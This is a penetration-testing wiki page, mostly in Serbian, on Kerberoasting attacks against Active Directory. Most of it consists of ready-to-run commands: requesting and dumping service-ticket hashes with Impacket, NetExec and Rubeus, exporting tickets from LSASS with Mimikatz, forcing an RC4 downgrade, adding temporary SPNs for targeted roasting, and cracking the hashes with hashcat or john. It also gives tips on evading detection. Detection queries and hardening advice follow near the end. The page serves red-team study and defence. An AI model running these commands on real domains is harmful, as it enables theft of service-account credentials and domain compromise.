# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na pribavljanje TGS ticket-a, konkretno onih koji se odnose na servise koji rade pod korisničkim nalozima u Active Directory (AD), isključujući račune računara. Enkripcija ovih ticket-a koristi ključeve koji potiču iz lozinki korisničkih naloga, što omogućava offline pucanje kredencijala. Korišćenje korisničkog naloga kao servisa je označeno nepraznim svojstvom ServicePrincipalName (SPN).

Bilo koji autentifikovani domen korisnik može zahtevati TGS ticket-e, tako da nisu potrebne posebne privilegije.

### Key Points

- Cilja TGS ticket-e za servise koji rade pod korisničkim nalozima (tj. nalozi sa postavljenim SPN; ne računarni nalozi).
- Ticket-i su enkriptovani ključem izvedenim iz lozinke servisnog naloga i mogu se crack-ovati offline.
- Nisu potrebne povišene privilegije; bilo koji autentifikovani nalog može da zahteva TGS ticket-e.

> [!WARNING]
> Većina javnih alata preferira zahtevanje RC4-HMAC (etype 23) service ticket-a jer su brži za crack-ovanje od AES-a. RC4 TGS hash-ovi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnogi okruženja prelaze na samo-AES. Ne pretpostavljajte da je samo RC4 relevantan.
> Takođe, izbegavajte „spray-and-pray” roasting. Rubeus’ default kerberoast može da upita i zahteva ticket-e za sve SPN-ove i to je bučno. Najpre enumerišite i ciljajte interesantne principe.

### Service account secrets & Kerberos crypto cost

Mnogi servisi i dalje rade pod korisničkim nalozima sa ručno upravljanim lozinkama. KDC enkriptuje servisne ticket-e ključevima izvedenim iz tih lozinki i isporučuje šifrotekst bilo kom autentifikovanom principalu, tako da kerberoasting daje neograničen offline broj pokušaja bez lockout-a ili telemetrije DC-a. Način enkripcije određuje budžet za crack-ovanje:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 sa 4,096 iteracija i per-principal salt-om generisanim iz domena + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blokira rainbow tables ali i dalje dozvoljava brzo crack-ovanje kratkih lozinki. |
| RC4 + NT hash | Jedan MD4 od lozinke (unsalted NT hash); Kerberos dodaje samo 8-byte confounder po ticket-u | etype 23 (`$krb5tgs$23$`) | ~4.18 milijardi guesses/s | ~1000× brže od AES; napadači forsiraju RC4 kad god `msDS-SupportedEncryptionTypes` to dozvoljava. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4-ov confounder samo randomizuje keystream; ne dodaje rad po pokušaju. Ako servisni nalozi ne koriste nasumične tajne (gMSA/dMSA, machine accounts, ili tajne upravljane u vault-u), brzina kompromitovanja zavisi isključivo od GPU budžeta. Primena samo-AES etype-ova uklanja milijarde-po-sekundi degradaciju, ali slabe ljudske lozinke i dalje podležu PBKDF2.

### Napad

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Alati sa više funkcija koji uključuju kerberoast provere:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerisati kerberoastable korisnike
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tehnika 1: Zatraži TGS i dump iz memorije
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tehnika 2: Automatski alati
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Zahtev za TGS generiše Windows Security Event 4769 (Zahtevan je Kerberos service ticket).

### OPSEC i AES-only okruženja

- Namerno zahtevajte RC4 za naloge bez AES:
- Rubeus: `/rc4opsec` koristi tgtdeleg za enumeraciju naloga bez AES i zahteva RC4 service tickets.
- Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve gde je moguće.
- Roast-ujte AES-only naloge umesto da neuspeh prođe neprimećeno:
- Rubeus: `/aes` enumeriše naloge sa omogućеним AES i zahteva AES service tickets (etype 17/18).
- Ako već posedujete TGT (PTT ili iz .kirbi), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Ciljanje, throttling i manje buke:
- Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtrirajte za verovatno slabe lozinke koristeći `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili ciljajte privilegovane OU-e sa `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Perzistencija / Zloupotreba

Ako kontrolišete ili možete izmeniti nalog, možete ga učiniti kerberoastable dodavanjem SPN-a:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Spustite nivo naloga da omogućite RC4 za lakše cracking (zahteva privilegije za pisanje na ciljnom objektu):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll over a user (temporary SPN)

When BloodHound shows that you have control over a user object (e.g., GenericWrite/GenericAll), you can reliably “targeted-roast” that specific user even if they do not currently have any SPNs:

- Dodajte privremeni SPN kontrolisanom korisniku da bi postao roastable.
- Zatražite TGS-REP enkriptovan RC4 (etype 23) za taj SPN da biste olakšali cracking.
- Crack the `$krb5tgs$23$...` hash with hashcat.
- Očistite SPN da biste smanjili footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux jednolinijska komanda (targetedKerberoast.py automatizuje dodavanje SPN -> zahteva TGS (etype 23) -> uklanja SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crack izlaz koristeći hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: dodavanje/uklanjanje SPN-ova proizvodi promene u direktorijumu (Event ID 5136/4738 na ciljanom korisniku) i TGS zahtev generiše Event ID 4769. Consider throttling i prompt cleanup.

Možete pronaći korisne alate za kerberoast napade ovde: https://github.com/nidem/kerberoast

Ako dobijete ovu grešku na Linuxu: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` to je zbog lokalnog vremenskog odstupanja. Sinhronizujte vreme sa DC:

- `ntpdate <DC_IP>` (zastarelo na nekim distribucijama)
- `rdate -n <DC_IP>`

### Kerberoast bez domenskog naloga (AS-requested STs)

U septembru 2022. Charlie Clark je pokazao da ako principal ne zahteva pre-authentication, moguće je dobiti service ticket putem posebno kreiranog KRB_AS_REQ menjajući sname u telu zahteva, efektivno dobijajući service ticket umesto TGT-a. Ovo je analogno AS-REP roasting i ne zahteva valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Morate obezbediti listu korisnika jer bez valid credentials ne možete query-ovati LDAP ovom tehnikom.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### Detekcija

Kerberoasting može biti prikriven. Potražite Event ID 4769 na DC-ovima i primenite filtere da smanjite šum:

- Isključite naziv servisa `krbtgt` i nazive servisa koji se završavaju sa `$` (računi računara).
- Isključite zahteve koji dolaze sa računa računara (`*$$@*`).
- Samo uspešni zahtevi (Failure Code `0x0`).
- Pratite tipove enkripcije: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne pravite alarm samo na `0x17`.

Primer PowerShell trijaže:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatne ideje:

- Uspostavite osnovnu normalnu upotrebu SPN po hostu/korisniku; alarmirajte pri velikim talasima različitih SPN zahteva od istog principal-a.
- Obeležite neuobičajenu upotrebu RC4 u domenima gde je primarno AES (AES-hardened).

### Mitigacija / Hardening

- Koristite gMSA/dMSA ili machine accounts za servise. Managed accounts imaju nasumične lozinke od 120+ karaktera i rotiraju se automatski, što čini offline crackovanje nepraktičnim.
- Sprovodite AES na service accounts postavljanjem `msDS-SupportedEncryptionTypes` na AES-only (decimal 24 / hex 0x18), a zatim rotirajte lozinku tako da se izvedu AES ključevi.
- Gde je moguće, onemogućite RC4 u vašem okruženju i pratite pokušaje korišćenja RC4. Na DCs možete koristiti registry vrednost `DefaultDomainSupportedEncTypes` da podesite podrazumevane vrednosti za naloge kojima nije postavljen `msDS-SupportedEncryptionTypes`. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove sa korisničkih naloga.
- Koristite duge, nasumične lozinke za service account-e (25+ karaktera) ako managed accounts nisu izvodljivi; zabranite uobičajene lozinke i redovno ih revizujte.

## Referencije

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
